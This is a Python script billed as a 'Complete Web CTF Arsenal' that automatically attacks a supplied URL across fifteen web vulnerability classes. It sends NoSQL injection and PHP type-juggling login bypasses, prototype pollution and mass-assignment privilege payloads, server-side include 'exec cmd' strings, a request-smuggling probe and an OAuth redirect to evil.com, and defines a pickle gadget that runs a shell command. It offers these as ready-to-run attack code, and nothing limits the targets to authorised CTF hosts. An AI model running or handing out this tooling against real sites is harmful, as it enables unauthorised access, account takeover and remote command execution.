#!/usr/bin/env python3
"""
web_complete.py — Complete Web CTF Arsenal
GraphQL | NoSQLi | Prototype Pollution | WebSocket | Race Condition
Subdomain Takeover | CORS | HTTP Smuggling | OAuth | Deserialization
For authorized CTF platforms: HackTheBox, TryHackMe, picoCTF
Usage: python web_complete.py <url>
"""

import requests
import re
import sys
import json
import time
import threading
import socket
import ssl
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urlencode

TARGET = sys.argv[1] if len(sys.argv) > 1 else input("[?] Target URL: ").strip()
SESSION = requests.Session()
SESSION.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'})
FLAGS = []
FLAG_RE = [r'HTB\{[^}]+\}', r'THM\{[^}]+\}', r'FLAG\{[^}]+\}',
           r'flag\{[^}]+\}', r'CTF\{[^}]+\}', r'picoCTF\{[^}]+\}']

def log(msg, t="*"):
    c = {"+": "\033[92m", "*": "\033[94m", "!": "\033[93m", "-": "\033[91m"}
    print(f"{c.get(t,'')}[{t}] {msg}\033[0m")

def find_flags(text):
    if not text: return []
    for p in FLAG_RE:
        for m in re.findall(p, str(text), re.IGNORECASE):
            if m not in FLAGS:
                FLAGS.append(m)
                log(f"FLAG: {m}", "+")
    return FLAGS

def get(url, **kw):
    try:
        r = SESSION.get(url, timeout=10, **kw)
        find_flags(r.text)
        return r
    except: return None

def post(url, **kw):
    try:
        r = SESSION.post(url, timeout=10, **kw)
        find_flags(r.text)
        return r
    except: return None


# ════════════════════════════════════════════
# 1. GRAPHQL INTROSPECTION & EXPLOITATION
# ════════════════════════════════════════════

def check_graphql(url):
    log("Testing GraphQL endpoints...", "*")
    endpoints = ['/graphql', '/api/graphql', '/graphiql',
                 '/v1/graphql', '/api/v1/graphql', '/query']

    introspection = {"query": "{ __schema { types { name fields { name } } } }"}
    flag_queries = [
        '{ flag }',
        '{ getFlag }',
        '{ secret }',
        '{ admin { flag } }',
        '{ users { flag } }',
        '{ flag { value } }',
        '{ ctf { flag } }',
        '{ challenge { flag } }',
    ]

    for ep in endpoints:
        full = urljoin(url, ep)
        r = post(full, json=introspection)
        if not r or r.status_code == 404: continue

        log(f"GraphQL endpoint found: {ep}", "+")
        try:
            data = r.json()
            if 'data' in data and '__schema' in str(data):
                log("Introspection enabled!", "+")
                types = data.get('data', {}).get('__schema', {}).get('types', [])
                for t in types:
                    if t.get('fields'):
                        for f in t['fields']:
                            name = f.get('name', '')
                            if any(k in name.lower() for k in
                                   ['flag', 'secret', 'admin', 'password', 'token']):
                                log(f"Interesting field: {t['name']}.{name}", "!")
                                r2 = post(full, json={"query": f"{{ {name} }}"})
                                if r2: find_flags(r2.text)
        except: pass

        for q in flag_queries:
            r2 = post(full, json={"query": q})
            if r2: find_flags(r2.text)

        # Batch query abuse
        batch = [{"query": "{ flag }"}, {"query": "{ admin { password } }"}]
        r3 = post(full, json=batch)
        if r3: find_flags(r3.text)


# ════════════════════════════════════════════
# 2. NOSQL INJECTION
# ════════════════════════════════════════════

def check_nosqli(url):
    log("Testing NoSQL Injection...", "*")

    nosql_payloads = [
        # MongoDB operators
        {"username": {"$gt": ""}, "password": {"$gt": ""}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}},
        {"username": "admin", "password": {"$ne": "wrong"}},
        {"username": {"$in": ["admin", "root", "user"]}, "password": {"$gt": ""}},
    ]

    string_payloads = [
        "admin' || '1'=='1",
        "'; return '' == '",
        "{\"$gt\": \"\"}",
        "admin\"; return true; var x=\"",
    ]

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for form in soup.find_all('form'):
        action = urljoin(url, form.get('action', url))
        inputs = [i.get('name', '') for i in form.find_all('input')
                  if i.get('name') and i.get('type') not in ['submit']]

        # JSON POST payloads
        for payload in nosql_payloads:
            r2 = post(action, json=payload,
                     headers={'Content-Type': 'application/json'})
            if r2: find_flags(r2.text)

        # String payloads
        for payload in string_payloads:
            for field in inputs:
                data = {i: (payload if i == field else 'test') for i in inputs}
                r3 = post(action, data=data)
                if r3 and any(w in r3.text.lower() for w in
                              ['welcome', 'dashboard', 'logout']):
                    log(f"NoSQLi via {field}: {payload[:40]}", "+")
                    find_flags(r3.text)


# ════════════════════════════════════════════
# 3. PROTOTYPE POLLUTION
# ════════════════════════════════════════════

def check_prototype_pollution(url):
    log("Testing Prototype Pollution...", "*")

    pp_payloads = [
        {"__proto__": {"admin": True}},
        {"__proto__": {"isAdmin": True}},
        {"constructor": {"prototype": {"admin": True}}},
        {"__proto__[admin]": "true"},
        {"__proto__[isAdmin]": "1"},
        {"__proto__[role]": "admin"},
    ]

    # URL parameter pollution
    pp_params = [
        "?__proto__[admin]=true",
        "?__proto__[isAdmin]=1",
        "?constructor[prototype][admin]=true",
        "?__proto__.admin=true",
    ]

    for param in pp_params:
        r = get(url + param)
        if r and r.status_code == 200:
            find_flags(r.text)

    # JSON body pollution
    for payload in pp_payloads:
        r = post(url, json=payload,
                headers={'Content-Type': 'application/json'})
        if r: find_flags(r.text)

        # After pollution, check if admin access granted
        r2 = get(url)
        if r2 and any(w in r2.text.lower() for w in
                      ['admin', 'flag', 'secret', 'dashboard']):
            log(f"Potential PP: {payload}", "!")
            find_flags(r2.text)


# ════════════════════════════════════════════
# 4. CORS MISCONFIGURATION
# ════════════════════════════════════════════

def check_cors(url):
    log("Testing CORS misconfiguration...", "*")

    test_origins = [
        'https://evil.com',
        'null',
        'http://localhost',
        f'{url}.evil.com',
    ]

    for origin in test_origins:
        r = get(url, headers={'Origin': origin})
        if not r: continue
        acao = r.headers.get('Access-Control-Allow-Origin', '')
        acac = r.headers.get('Access-Control-Allow-Credentials', '')

        if acao == origin or acao == '*':
            log(f"CORS misconfigured: Origin={origin} → ACAO={acao}", "+")
            if 'true' in acac.lower():
                log("CORS + Credentials = HIGH IMPACT!", "+")
            find_flags(r.text)


# ════════════════════════════════════════════
# 5. RACE CONDITION
# ════════════════════════════════════════════

def check_race_condition(url):
    log("Testing Race Condition...", "*")
    results = []

    def make_request(endpoint, data):
        try:
            r = SESSION.post(endpoint, data=data, timeout=5)
            results.append(r.text)
            find_flags(r.text)
        except: pass

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for form in soup.find_all('form'):
        action = urljoin(url, form.get('action', url))
        method = form.get('method', 'post').lower()
        if method != 'post': continue

        inputs = {i.get('name', ''): i.get('value', 'test')
                  for i in form.find_all('input') if i.get('name')}

        # Look for redeem/coupon/vote/transfer endpoints
        if any(k in action.lower() for k in
               ['redeem', 'coupon', 'vote', 'transfer', 'buy', 'claim', 'spin']):
            log(f"Race condition candidate: {action}", "!")
            threads = [threading.Thread(target=make_request, args=(action, inputs))
                       for _ in range(10)]
            for t in threads: t.start()
            for t in threads: t.join()
            log(f"Sent 10 concurrent requests to {action}", "*")


# ════════════════════════════════════════════
# 6. SUBDOMAIN TAKEOVER CHECK
# ════════════════════════════════════════════

def check_subdomain_takeover(domain):
    log(f"Checking subdomain takeover for {domain}...", "*")

    # Fingerprints for vulnerable services
    fingerprints = {
        'github.io': "There isn't a GitHub Pages site here",
        'herokuapp.com': 'No such app',
        'azurewebsites.net': 'There is no App Service plan with that name',
        'amazonaws.com': 'NoSuchBucket',
        'fastly.net': 'Fastly error: unknown domain',
        'pantheon.io': '404 Target site not found',
        'shopify.com': 'Sorry, this shop is currently unavailable',
        'wordpress.com': "Don't see your site here?",
        'surge.sh': 'project not found',
        'netlify.com': 'Not Found',
    }

    try:
        import subprocess
        result = subprocess.run(['subfinder', '-d', domain, '-silent'],
                               capture_output=True, text=True, timeout=30)
        subdomains = result.stdout.strip().split('\n')

        for sub in subdomains[:20]:
            if not sub: continue
            try:
                r = SESSION.get(f'https://{sub}', timeout=5, verify=False)
                for service, fingerprint in fingerprints.items():
                    if fingerprint.lower() in r.text.lower():
                        log(f"SUBDOMAIN TAKEOVER: {sub} → {service}", "+")
            except requests.exceptions.ConnectionError:
                try:
                    # CNAME exists but no content = takeover possible
                    import socket
                    socket.gethostbyname(sub)
                    log(f"Potential takeover (DNS resolves, no content): {sub}", "!")
                except: pass
    except FileNotFoundError:
        log("subfinder not installed. Run: sudo pacman -S subfinder", "!")


# ════════════════════════════════════════════
# 7. HTTP REQUEST SMUGGLING
# ════════════════════════════════════════════

def check_smuggling(url):
    log("Testing HTTP Request Smuggling...", "*")
    parsed = urlparse(url)
    host = parsed.netloc
    path = parsed.path or '/'

    # CL.TE smuggling probe
    smuggle_payload = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "G"
    )

    try:
        sock = socket.create_connection((host, 443 if 'https' in url else 80), timeout=5)
        if 'https' in url:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.sendall(smuggle_payload.encode())
        response = sock.recv(4096).decode('utf-8', errors='ignore')
        sock.close()

        if '400' not in response and '200' in response:
            log(f"Possible HTTP smuggling vulnerability!", "!")
            find_flags(response)
    except Exception as e:
        log(f"Smuggling check error: {e}", "-")


# ════════════════════════════════════════════
# 8. OAUTH MISCONFIGURATION
# ════════════════════════════════════════════

def check_oauth(url):
    log("Testing OAuth misconfiguration...", "*")

    r = get(url)
    if not r: return

    # Find OAuth endpoints
    oauth_patterns = ['oauth', 'authorize', 'callback', 'token', 'auth/google',
                      'auth/github', 'auth/facebook', 'login/oauth']

    soup = BeautifulSoup(r.text, 'html.parser')
    for a in soup.find_all('a', href=True):
        href = a['href']
        if any(p in href.lower() for p in oauth_patterns):
            log(f"OAuth endpoint: {href}", "!")

            # Test redirect_uri manipulation
            if 'redirect_uri' in href:
                manipulated = re.sub(
                    r'redirect_uri=[^&]+',
                    'redirect_uri=https://evil.com',
                    href
                )
                r2 = get(urljoin(url, manipulated),
                         allow_redirects=False)
                if r2 and r2.status_code in [301, 302]:
                    location = r2.headers.get('Location', '')
                    if 'evil.com' in location:
                        log(f"OAuth redirect_uri bypass! Redirects to evil.com", "+")

            # Test state parameter missing
            if 'state=' not in href:
                log(f"OAuth missing state parameter (CSRF risk): {href}", "!")


# ════════════════════════════════════════════
# 9. INSECURE DESERIALIZATION
# ════════════════════════════════════════════

def check_deserialization(url):
    log("Testing Insecure Deserialization...", "*")

    # PHP serialized object
    php_payloads = [
        'O:8:"stdClass":0:{}',
        'a:1:{s:5:"admin";b:1;}',
    ]

    # Java serialized (magic bytes)
    java_magic = b'\xac\xed\x00\x05'

    # Python pickle
    import pickle, os
    class Exploit(object):
        def __reduce__(self):
            return (os.system, ('cat /flag.txt',))

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    # Check cookies for serialized data
    for name, val in SESSION.cookies.items():
        import base64
        try:
            decoded = base64.b64decode(val + '==')
            if decoded.startswith(b'O:') or java_magic in decoded:
                log(f"Serialized data in cookie '{name}'!", "!")
        except: pass

    # Test PHP deserialization in params
    for payload in php_payloads:
        for param in ['data', 'object', 'serialize', 'session', 'user']:
            r2 = get(url, params={param: payload})
            if r2: find_flags(r2.text)


# ════════════════════════════════════════════
# 10. WEBSOCKET TESTING
# ════════════════════════════════════════════

def check_websocket(url):
    log("Testing WebSocket...", "*")
    try:
        import websocket

        ws_url = url.replace('https://', 'wss://').replace('http://', 'ws://')
        ws_endpoints = [ws_url, f"{ws_url}/ws", f"{ws_url}/socket",
                        f"{ws_url}/chat", f"{ws_url}/live"]

        payloads = [
            '{"type":"flag"}',
            '{"action":"getFlag"}',
            '{"cmd":"flag"}',
            '{"message":"{{7*7}}"}',
            '{"id":1,"action":"admin"}',
        ]

        def on_message(ws, message):
            log(f"WS Response: {message[:100]}", "!")
            find_flags(message)

        for ep in ws_endpoints:
            try:
                ws = websocket.WebSocketApp(ep, on_message=on_message)
                t = threading.Thread(target=ws.run_forever)
                t.daemon = True
                t.start()
                time.sleep(1)
                for p in payloads:
                    try: ws.send(p)
                    except: pass
                time.sleep(1)
                ws.close()
            except: pass

    except ImportError:
        log("websocket-client not installed. Run: pip install websocket-client", "!")


# ════════════════════════════════════════════
# 11. SERVER-SIDE INCLUDES (SSI)
# ════════════════════════════════════════════

def check_ssi(url):
    log("Testing Server-Side Includes...", "*")
    ssi_payloads = [
        '<!--#exec cmd="cat /flag.txt"-->',
        '<!--#include file="/flag.txt"-->',
        '<!--#echo var="DATE_LOCAL"-->',
        '<!--#printenv-->',
    ]
    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for form in soup.find_all('form'):
        action = urljoin(url, form.get('action', url))
        inputs = {i.get('name', ''): i.get('value', '')
                  for i in form.find_all('input') if i.get('name')}

        for payload in ssi_payloads:
            for field in inputs:
                data = {k: (payload if k == field else v)
                        for k, v in inputs.items()}
                r2 = post(action, data=data)
                if r2: find_flags(r2.text)

    # Check URL parameters
    for param in ['name', 'page', 'file', 'include', 'input']:
        for payload in ssi_payloads:
            r2 = get(url, params={param: payload})
            if r2: find_flags(r2.text)


# ════════════════════════════════════════════
# 12. HTTP VERB TAMPERING
# ════════════════════════════════════════════

def check_verb_tampering(url):
    log("Testing HTTP Verb Tampering...", "*")
    verbs = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH',
             'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']

    paths = ['/', '/admin', '/flag', '/api/flag', '/secret']

    for path in paths:
        full = urljoin(url, path)
        for verb in verbs:
            try:
                r = SESSION.request(verb, full, timeout=5)
                if r.status_code == 200 and verb not in ['GET', 'POST']:
                    log(f"Verb {verb} allowed on {path}: {r.status_code}", "!")
                    find_flags(r.text)
                    if r.text:
                        log(f"Response: {r.text[:100]}", "!")
            except: pass


# ════════════════════════════════════════════
# 13. PARAMETER POLLUTION & BYPASS
# ════════════════════════════════════════════

def check_param_pollution(url):
    log("Testing Parameter Pollution...", "*")

    # HTTP Parameter Pollution
    pollution_tests = [
        f"{url}?admin=false&admin=true",
        f"{url}?role=user&role=admin",
        f"{url}?id=1&id=../../../flag",
        f"{url}?page=home&page=admin",
    ]

    for test_url in pollution_tests:
        r = get(test_url)
        if r and r.status_code == 200:
            find_flags(r.text)
            if any(w in r.text.lower() for w in ['admin', 'flag', 'secret']):
                log(f"Interesting HPP response: {test_url}", "!")


# ════════════════════════════════════════════
# 14. TYPE JUGGLING (PHP)
# ════════════════════════════════════════════

def check_type_juggling(url):
    log("Testing PHP Type Juggling...", "*")

    # PHP loose comparison bypasses
    juggling_payloads = [
        {"password": True},
        {"password": 0},
        {"password": "0"},
        {"password": []},
        {"username": "admin", "password": True},
        {"username": "admin", "password": 0},
    ]

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for form in soup.find_all('form'):
        action = urljoin(url, form.get('action', url))
        for payload in juggling_payloads:
            r2 = post(action, json=payload,
                     headers={'Content-Type': 'application/json'})
            if r2: find_flags(r2.text)


# ════════════════════════════════════════════
# 15. MASS ASSIGNMENT
# ════════════════════════════════════════════

def check_mass_assignment(url):
    log("Testing Mass Assignment...", "*")

    extra_fields = [
        {"isAdmin": True, "role": "admin", "admin": True,
         "is_admin": 1, "user_type": "admin"},
    ]

    r = get(url)
    if not r: return
    soup = BeautifulSoup(r.text, 'html.parser')

    for form in soup.find_all('form'):
        action = urljoin(url, form.get('action', url))
        method = form.get('method', 'get').lower()
        if method != 'post': continue

        base_data = {i.get('name', ''): i.get('value', 'test')
                     for i in form.find_all('input') if i.get('name')}

        for extra in extra_fields:
            combined = {**base_data, **extra}
            r2 = post(action, data=combined)
            if r2: find_flags(r2.text)

            # JSON version
            r3 = post(action, json=combined,
                     headers={'Content-Type': 'application/json'})
            if r3: find_flags(r3.text)


# ════════════════════════════════════════════
# MAIN RUNNER
# ════════════════════════════════════════════

def run():
    print(f"""
\033[92m╔══════════════════════════════════════════╗
║  COMPLETE WEB CTF ARSENAL                ║
║  15 attack categories                    ║
║  Target: {TARGET[:32]:<32}║
╚══════════════════════════════════════════╝\033[0m
""")
    checks = [
        check_graphql, check_nosqli, check_prototype_pollution,
        check_cors, check_race_condition, check_oauth,
        check_deserialization, check_ssi, check_verb_tampering,
        check_param_pollution, check_type_juggling, check_mass_assignment,
        check_smuggling, check_websocket,
    ]

    parsed = urlparse(TARGET)
    domain = parsed.netloc

    for check in checks:
        if FLAGS: break
        try:
            if check == check_subdomain_takeover:
                check(domain)
            else:
                check(TARGET)
        except KeyboardInterrupt:
            break
        except Exception as e:
            log(f"{check.__name__} error: {e}", "-")

    print("\n\033[92m── FINAL RESULTS ──")
    if FLAGS:
        print(f"  {len(FLAGS)} flag(s) found:")
        for f in FLAGS:
            print(f"  ✓ {f}")
    else:
        print("  No flags found automatically.")
        print("  Manual checks needed: logic flaws, chaining, business logic")
    print("══════════════════\033[0m\n")


if __name__ == "__main__":
    run()
